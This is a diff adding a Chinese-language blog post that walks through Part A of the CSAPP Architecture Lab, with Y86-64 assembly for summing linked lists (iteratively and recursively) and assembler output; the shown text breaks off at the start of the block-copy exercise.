@@ -145,6 +145,914 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yiweiboi.github.io/2024/03/16/CSAPP-Lab4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yiweiBoi">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/03/16/CSAPP-Lab4/" class="post-title-link" itemprop="url">CSAPP ArchLab</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-03-16 15:36:09" itemprop="dateCreated datePublished" datetime="2024-03-16T15:36:09+08:00">2024-03-16</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-03-27 15:44:06" itemprop="dateModified" datetime="2024-03-27T15:44:06+08:00">2024-03-27</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><ul>
+<li><p>实验开始前请阅读：<a target="_blank" rel="noopener" href="http://csapp.cs.cmu.edu/3e/archlab.pdf">archlab.pdf (cmu.edu)</a></p>
+</li>
+<li><p>实验分为三个部分</p>
+</li>
+<li><p>在 A 部分中，您将编写一些简单的 Y86-64 程序并熟悉 Y86-64 工具</p>
+</li>
+<li><p>在 B 部分中，您将使用新指令扩展 SEQ 仿真器</p>
+</li>
+<li><p>这两部分将为您准备 C 部分，即实验室的核心，您将在其中优化 Y86-64 基准测试程序和处理器设计</p>
+</li>
+<li><p>当按照讲义说明在 sim 目录下通过命令 <strong>make clean; clean</strong> 构建 Y86-64 工具时，可能出现错误，请分别输入以下命令下载相关依赖</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install tcl tcl-dev tk tk-dev</span><br><span class="line">sudo apt install flex</span><br><span class="line">sudo apt install bison</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>回忆一下 Y86-64 指令的一些细节</p>
+<ul>
+<li><p><code>irmovq、rrmovq、mrmovq、rmmovq </code> 前两个字母分别指示源和目的，i 立即数、r 寄存器、m 内存</p>
+<blockquote>
+<p>内存引用方式只支持基址和偏移量的形式</p>
+</blockquote>
+</li>
+<li><p><code>addq、subq、xorq</code> 只能对寄存器操作，只有它们会设置条件码</p>
+</li>
+<li><p><code>jmp、jle、jl、je、jne、jge、jg</code> 和 x86-64 一样</p>
+</li>
+<li><p><code>cmovle、comvl、cmove、cmovne、cmovge、cmovg</code> 条件跳转指令</p>
+</li>
+<li><p><code>pushq、popq</code> 和 x86-64 一样</p>
+</li>
+<li><p><code>halt</code> 停止指令的执行</p>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="Part-A"><a href="#Part-A" class="headerlink" title="Part A"></a>Part A</h1><ul>
+<li>在这一部分中，您将在目录 <strong>sim&#x2F;misc</strong> 中工作。您的任务是编写和模拟以下三个 Y86-64 程序，这些程序的所需行为由 examples.c 中的示例 C 函数定义</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * Architecture Lab: Part A </span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * High level specs for the functions that the students will rewrite</span></span><br><span class="line"><span class="comment"> * in Y86-64 assembly language</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* $begin examples */</span></span><br><span class="line"><span class="comment">/* linked list element */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ELE</span> &#123;</span></span><br><span class="line">    <span class="type">long</span> val;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ELE</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; *list_ptr;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* sum_list - Sum the elements of a linked list */</span></span><br><span class="line"><span class="type">long</span> <span class="title function_">sum_list</span><span class="params">(list_ptr ls)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> val = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (ls) &#123;</span><br><span class="line">	val += ls-&gt;val;</span><br><span class="line">	ls = ls-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* rsum_list - Recursive version of sum_list */</span></span><br><span class="line"><span class="type">long</span> <span class="title function_">rsum_list</span><span class="params">(list_ptr ls)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!ls)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="type">long</span> val = ls-&gt;val;</span><br><span class="line">	<span class="type">long</span> rest = rsum_list(ls-&gt;next);</span><br><span class="line">	<span class="keyword">return</span> val + rest;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* copy_block - Copy src to dest and return xor checksum of src */</span></span><br><span class="line"><span class="type">long</span> <span class="title function_">copy_block</span><span class="params">(<span class="type">long</span> *src, <span class="type">long</span> *dest, <span class="type">long</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">	<span class="type">long</span> val = *src++;</span><br><span class="line">	*dest++ = val;</span><br><span class="line">	result ^= val;</span><br><span class="line">	len--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* $end examples */</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>讲义中的一些说明<ul>
+<li>您可以通过首先使用程序 YAS 组装程序，然后使用指令集模拟器 YIS 运行它们来测试程序</li>
+<li>在所有 Y86-64 函数中，您应遵循 x86-64 约定来传递函数参数、使用寄存器和使用堆栈。这包括保存和恢复您使用的任何被调用方保存寄存器</li>
+</ul>
+</li>
+</ul>
+<h1 id="sum-ys"><a href="#sum-ys" class="headerlink" title="sum.ys"></a>sum.ys</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* sum_list - Sum the elements of a linked list */</span></span><br><span class="line"><span class="type">long</span> <span class="title function_">sum_list</span><span class="params">(list_ptr ls)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> val = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (ls) &#123;</span><br><span class="line">	val += ls-&gt;val;</span><br><span class="line">	ls = ls-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>编写一个 Y86-64 程序 sum.ys，以迭代方式对链表的元素求和</li>
+<li>讲义中的一些说明<ul>
+<li>您的程序应该包含一些代码，这些代码设置堆栈结构，调用函数，然后停止</li>
+<li>使用以下三个元素链表测试程序</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># Sample linked list</span><br><span class="line">	.align 8</span><br><span class="line">ele1:</span><br><span class="line">	.quad 0x00a</span><br><span class="line">	.quad ele2</span><br><span class="line">ele2:</span><br><span class="line">	.quad 0x0b0</span><br><span class="line">	.quad ele3</span><br><span class="line">ele3:</span><br><span class="line">	.quad 0xc00</span><br><span class="line">	.quad 0</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>根据讲义中的说明，我们的用 Y86-64 汇编代码编写的程序应该是一个完整的程序，包括栈的放置、数据初始化、程序初始化和程序结束等问题</p>
+<blockquote>
+<p>完整的 Y86-64 程序例子详见 CSAPP p252</p>
+</blockquote>
+</li>
+<li><p>分析一下链表的结构</p>
+</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* $begin examples */</span></span><br><span class="line"><span class="comment">/* linked list element */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ELE</span> &#123;</span></span><br><span class="line">    <span class="type">long</span> val;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ELE</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; *list_ptr;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>链表的一个结点有 16 个字节，前 8 个字节存储 val，后 8 个字节存储 next，所以可以通过 **%rdi &#x3D; <em>(%rdi + 8)</em>* 得到下一个结点的起始地址实现遍历</p>
+</li>
+<li><p>sum.ys 的汇编代码如下</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"># 执行开始于地址 0</span><br><span class="line">	.pos 0</span><br><span class="line">	irmovq stack, %rsp	# 设置栈指针</span><br><span class="line">	call main 			# 执行 main 程序</span><br><span class="line">	halt				# 终止程序</span><br><span class="line">	</span><br><span class="line"># 要执行的链表</span><br><span class="line">	.align 8</span><br><span class="line">ele1:</span><br><span class="line">	.quad 0x00a			# 结点中存储的值</span><br><span class="line">	.quad ele2</span><br><span class="line">ele2:</span><br><span class="line">	.quad 0x0b0</span><br><span class="line">	.quad ele3</span><br><span class="line">ele3:</span><br><span class="line">	.quad 0xc00</span><br><span class="line">	.quad 0</span><br><span class="line">	</span><br><span class="line">main:</span><br><span class="line">	irmovq ele1,%rdi	# %rdi = ele1</span><br><span class="line">	call sum			# 调用 sum</span><br><span class="line">	ret</span><br><span class="line"></span><br><span class="line"># 对链表元素求和	</span><br><span class="line">sum:</span><br><span class="line">	xorq %rax,%rax		# %rax = 0</span><br><span class="line">	andq %rdi,%rdi		# 测试 %rdi 是否为 null</span><br><span class="line">	jmp test			# 直接跳转到 test</span><br><span class="line">loop:</span><br><span class="line">	mrmovq (%rdi),%r8	# %r8 = *(%rdi) 取出结点中存储的值</span><br><span class="line">	addq %r8,%rax		# %rax += %r8</span><br><span class="line">	mrmovq 8(%rdi),%rdi	# %rdi = *(%rdi + 8) 取出并赋值为下个结点的起始地址</span><br><span class="line">	andq %rdi,%rdi		# 测试 %rdi 是否为 null</span><br><span class="line">test:</span><br><span class="line">	jne loop			# 如果链表结点不为为空，跳转到 loop</span><br><span class="line">	ret</span><br><span class="line">	</span><br><span class="line">	.pos 0x200			# 栈的起始地址，向上增长</span><br><span class="line">stack:</span><br></pre></td></tr></table></figure>
+
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ul>
+<li><p>创建一个 sum.ys 文件，写入上述汇编代码</p>
+</li>
+<li><p>通过命令  <strong>.&#x2F;yas sum.ys</strong> 得到 sum.yo 文件，汇编结果如下</p>
+<blockquote>
+<p>YAS 是 Y86-64 代码的汇编器</p>
+</blockquote>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">                            | # 执行开始于地址 0</span><br><span class="line">0x000:                      | 	.pos 0</span><br><span class="line">0x000: 30f40002000000000000 | 	irmovq stack, %rsp	# 设置栈指针</span><br><span class="line">0x00a: 804800000000000000   | 	call main 		# 执行 main 程序</span><br><span class="line">0x013: 00                   | 	halt			# 终止程序</span><br><span class="line">                            | 	</span><br><span class="line">                            | # 要执行的链表</span><br><span class="line">0x018:                      | 	.align 8</span><br><span class="line">0x018:                      | ele1:</span><br><span class="line">0x018: 0a00000000000000     | 	.quad 0x00a</span><br><span class="line">0x020: 2800000000000000     | 	.quad ele2</span><br><span class="line">0x028:                      | ele2:</span><br><span class="line">0x028: b000000000000000     | 	.quad 0x0b0</span><br><span class="line">0x030: 3800000000000000     | 	.quad ele3</span><br><span class="line">0x038:                      | ele3:</span><br><span class="line">0x038: 000c000000000000     | 	.quad 0xc00</span><br><span class="line">0x040: 0000000000000000     | 	.quad 0</span><br><span class="line">                            | 	</span><br><span class="line">0x048:                      | main:</span><br><span class="line">0x048: 30f71800000000000000 | 	irmovq ele1,%rdi	# 将链表的起始地址放入 %rdi 作为参数</span><br><span class="line">0x052: 805c00000000000000   | 	call sum		# 调用 sum</span><br><span class="line">0x05b: 90                   | 	ret</span><br><span class="line">                            | </span><br><span class="line">                            | # 对链表元素求和	</span><br><span class="line">0x05c:                      | sum:</span><br><span class="line">0x05c: 6300                 | 	xorq %rax,%rax</span><br><span class="line">0x05e: 6277                 | 	andq %rdi,%rdi</span><br><span class="line">0x060: 708100000000000000   | 	jmp test</span><br><span class="line">0x069:                      | loop:</span><br><span class="line">0x069: 50870000000000000000 | 	mrmovq (%rdi),%r8</span><br><span class="line">0x073: 6080                 | 	addq %r8,%rax</span><br><span class="line">0x075: 50770800000000000000 | 	mrmovq 8(%rdi),%rdi</span><br><span class="line">0x07f: 6277                 | 	andq %rdi,%rdi</span><br><span class="line">0x081:                      | test:</span><br><span class="line">0x081: 746900000000000000   | 	jne loop	# 如果链表结点为空，返回</span><br><span class="line">0x08a: 90                   | 	ret</span><br><span class="line">                            | 	</span><br><span class="line">                            | </span><br><span class="line">0x200:                      | 	.pos 0x200</span><br><span class="line">0x200:                      | stack:</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>通过命令 <strong>.&#x2F;yis sum.yo</strong> 运行程序</p>
+<blockquote>
+<p>YIS 是一个指令集模拟器，它的目的是模拟 Y86-64 机器代码程序的执行，而不用试图去模拟任何具体处理器实现的行为</p>
+</blockquote>
+</li>
+</ul>
+<h2 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h2><ul>
+<li><strong>运行结果</strong></li>
+</ul>
+<img src="/2024/03/16/CSAPP-Lab4/image-20240316161337114.png" class="" title="image-20240316161337114">
+
+<ul>
+<li>返回值 %rax &#x3D;&#x3D; 0x000a + 0x00b0 + 0x0c00 &#x3D; 0x0cba，结果正确</li>
+</ul>
+<h1 id="rsum-ys"><a href="#rsum-ys" class="headerlink" title="rsum.ys"></a>rsum.ys</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* rsum_list - Recursive version of sum_list */</span></span><br><span class="line"><span class="type">long</span> <span class="title function_">rsum_list</span><span class="params">(list_ptr ls)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!ls)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="type">long</span> val = ls-&gt;val;</span><br><span class="line">	<span class="type">long</span> rest = rsum_list(ls-&gt;next);</span><br><span class="line">	<span class="keyword">return</span> val + rest;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>编写一个 Y86-64 程序 rsum.ys，它以递归方式对链表的元素求和</p>
+</li>
+<li><p>讲义中的一些说明</p>
+<ul>
+<li>此代码应与 sum.ys 中的代码类似，不同之处在于它应该使用一个函数 rsum_list</li>
+<li>该函数对数字链表进行递归求和，使用相同的三元素链表测试程序</li>
+</ul>
+</li>
+<li><p>rsum.ys 的汇编代码如下</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">	.pos 0</span><br><span class="line">	irmovq stack,%rsp	# 设置栈指针</span><br><span class="line">	call main			# 执行 main 程序</span><br><span class="line">	halt				# 终止程序</span><br><span class="line"></span><br><span class="line"># 链表</span><br><span class="line">	.align8</span><br><span class="line">ele1:</span><br><span class="line">	.quad 0x00a		</span><br><span class="line">	.quad ele2</span><br><span class="line">ele2:</span><br><span class="line">	.quad 0x0b0</span><br><span class="line">	.quad ele3</span><br><span class="line">ele3:</span><br><span class="line">	.quad 0xc00</span><br><span class="line">	.quad 0</span><br><span class="line">	</span><br><span class="line">main:</span><br><span class="line">	irmovq ele1,%rdi	# %rdi = ele1，设置参数</span><br><span class="line">	call rsum_list		# 调用 rsum_list</span><br><span class="line">	ret</span><br><span class="line">	</span><br><span class="line">rsum_list:</span><br><span class="line">	xorq %rax,%rax		# %rax = 0</span><br><span class="line">	jmp test			# 直接跳转到 test</span><br><span class="line">loop:</span><br><span class="line">	mrmovq (%rdi),%r8	# %r8 = *(%rdi) 取出结点存储的值</span><br><span class="line">	mrmovq 8(%rdi),%rdi	# %rdi = *(%rdi + 8) 取出下一个结点的起始地址</span><br><span class="line">	pushq %r8			# 将 %r8 入栈</span><br><span class="line">	call rsum_list		# 调用 rsum_list，相当于 rsum_list(ls-&gt;next)</span><br><span class="line">	popq %r8			# 将 %r8 出栈</span><br><span class="line">	addq %r8,%rax		# %rax += %r8</span><br><span class="line">	ret</span><br><span class="line">test:</span><br><span class="line">	andq %rdi,%rdi		# 测试链表是否为 null</span><br><span class="line">	jne loop			# 如果不为 null，跳转到 loop</span><br><span class="line">	ret</span><br><span class="line">	</span><br><span class="line">	.pos 0x200			# 栈的起始地址，向上增长</span><br><span class="line">stack:</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>pushq %r8 是必须的，否则 %r8 会变得不确定</li>
+</ul>
+<h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><ul>
+<li>创建 rsum_list 文件，写入上述汇编代码</li>
+<li>通过命令 <strong>.&#x2F;yas rsum.ys</strong> 得到 rsum.yo 文件，汇编结果如下</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">0x000:                      | 	.pos 0</span><br><span class="line">0x000: 30f40002000000000000 | 	irmovq stack,%rsp	# 设置栈指针</span><br><span class="line">0x00a: 804800000000000000   | 	call main		# 执行 main 程序</span><br><span class="line">0x013: 00                   | 	halt			# 终止程序</span><br><span class="line">                            | </span><br><span class="line">                            | # 链表</span><br><span class="line">0x018:                      | 	.align8</span><br><span class="line">0x018:                      | ele1:</span><br><span class="line">0x018: 0a00000000000000     | 	.quad 0x00a</span><br><span class="line">0x020: 2800000000000000     | 	.quad ele2</span><br><span class="line">0x028:                      | ele2:</span><br><span class="line">0x028: b000000000000000     | 	.quad 0x0b0</span><br><span class="line">0x030: 3800000000000000     | 	.quad ele3</span><br><span class="line">0x038:                      | ele3:</span><br><span class="line">0x038: 000c000000000000     | 	.quad 0xc00</span><br><span class="line">0x040: 0000000000000000     | 	.quad 0</span><br><span class="line">                            | 	</span><br><span class="line">0x048:                      | main:</span><br><span class="line">0x048: 30f71800000000000000 | 	irmovq ele1,%rdi</span><br><span class="line">0x052: 805c00000000000000   | 	call rsum_list</span><br><span class="line">0x05b: 90                   | 	ret</span><br><span class="line">                            | 	</span><br><span class="line">0x05c:                      | rsum_list:</span><br><span class="line">0x05c: 6300                 | 	xorq %rax,%rax</span><br><span class="line">0x05e: 708b00000000000000   | 	jmp test</span><br><span class="line">0x067:                      | loop:</span><br><span class="line">0x067: 50870000000000000000 | 	mrmovq (%rdi),%r8</span><br><span class="line">0x071: 50770800000000000000 | 	mrmovq 8(%rdi),%rdi</span><br><span class="line">0x07b: a08f                 | 	pushq %r8</span><br><span class="line">0x07d: 805c00000000000000   | 	call rsum_list</span><br><span class="line">0x086: b08f                 | 	popq %r8</span><br><span class="line">0x088: 6080                 | 	addq %r8,%rax</span><br><span class="line">0x08a: 90                   | 	ret</span><br><span class="line">0x08b:                      | test:</span><br><span class="line">0x08b: 6277                 | 	andq %rdi,%rdi</span><br><span class="line">0x08d: 746700000000000000   | 	jne loop</span><br><span class="line">0x096: 90                   | 	ret</span><br><span class="line">                            | 	</span><br><span class="line">0x200:                      | 	.pos 0x200</span><br><span class="line">0x200:                      | stack:</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>通过命令 <strong>.&#x2F;yis rsum.yo</strong> 运行程序</li>
+</ul>
+<h2 id="Result-1"><a href="#Result-1" class="headerlink" title="Result"></a>Result</h2><ul>
+<li><strong>运行结果</strong></li>
+</ul>
+<img src="/2024/03/16/CSAPP-Lab4/image-20240316164804172.png" class="" title="image-20240316164804172">
+
+<ul>
+<li>%rax &#x3D;&#x3D; 0x0cba，结果正确</li>
+</ul>
+<h1 id="copy-ys"><a href="#copy-ys" class="headerlink" title="copy.ys"></a>copy.ys</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* copy_block - Copy src to dest and return xor checksum of src */</span></span><br><span class="line"><span class="type">long</span> <span class="title function_">copy_block</span><span class="params">(<span class="type">long</span> *src, <span class="type">long</span> *dest, <span class="type">long</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">	<span class="type">long</span> val = *src++;</span><br><span class="line">	*dest++ = val;</span><br><span class="line">	result ^= val;</span><br><span class="line">	len--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* $end examples */</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>编写一个程序 copy.ys，将单词块从内存的一部分复制到内存的另一部分（非重叠区域），计算所有复制单词的校验和 （Xor）</li>
+<li>讲义中的一些说明<ul>
+<li>程序应包含设置堆栈帧、调用函数复制块然后停止的代码</li>
+<li>使用以下三元素源块和目标块测试程序</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">	.align 8</span><br><span class="line"># Source block</span><br><span class="line">src:</span><br><span class="line">	.quad 0x00a</span><br><span class="line">	.quad 0x0b0</span><br><span class="line">	.quad 0xc00</span><br><span class="line"># Destination block</span><br><span class="line">dest:</span><br><span class="line">	.quad 0x111</span><br><span class="line">	.quad 0x222</span><br><span class="line">	.quad 0x333</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>我们可以知道 src 和 dest 为 long 的数组</li>
+<li>copy.ys 的汇编代码如下</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 